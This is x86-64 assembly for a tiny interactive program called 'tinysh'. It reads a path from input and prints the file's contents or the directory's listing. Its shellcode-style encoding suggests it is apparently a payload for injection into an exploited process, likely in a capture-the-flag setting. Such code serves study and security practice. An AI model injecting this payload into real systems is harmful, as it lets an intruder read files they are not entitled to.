.intel_syntax noprefix
.globl _start
_start:
tinysh:
    xor rax,rax # read
    push rax
    pop rdi
    push rsp
    pop rsi
    push rax
    pop rdx
    mov dl,0xff
    syscall
    mov byte ptr [rsp+rax-1],0x0 # remove trailling newline

    xor rax,rax
    push rsp
    pop rdi
    push rax
    pop rsi
    push rax
    pop rdx
    mov al,0x2 # open
    syscall
    test rax,rax
    js tinysh
    mov rbx,rax # fd

file_read:
    xor rax,rax # read
    push rbx
    pop rdi
    push rsp
    pop rsi
    push rax
    pop rdx
    inc rdx
    shl rdx,0xc
    syscall
    test rax,rax
    js dir_read

    xchg rax,rdx
    xor rax,rax
    mov dil,0x1
    mov al,0x1 # write
    syscall
    jmp tinysh

dir_read:
getdents:
    xor rax,rax
    mov dl,0x7f
    mov rsi,rsp # linux_dirent
    mov rdi,rbx # fd
    mov al,0x4e # getdents
    syscall
    cmp rax,1
    jl tinysh
    mov r10,rsp
    lea r8,[rax+r10]  # nread
next_ent:
    lea rsi,[r10+0x12] # d_name
write:
    xor rdx,rdx
    mov dl,0x1  # count
    mov dil,0x1 # fd
    xor rax,rax
    mov al,0x1 # write
    syscall
    inc rsi
    mov al,byte ptr [rsi]
    test al,al
    jnz write

    lea rsi,[rdx+0x9] # '\n'
    push rsi
    mov rsi,rsp
    mov al,0x1 # write
    syscall
    add rsp, 8

    xor rsi,rsi
    movzx rsi,word ptr [r10+0x10] # d_reclen
    add r10,rsi
    cmp r10,r8
    jl next_ent
    jmp getdents
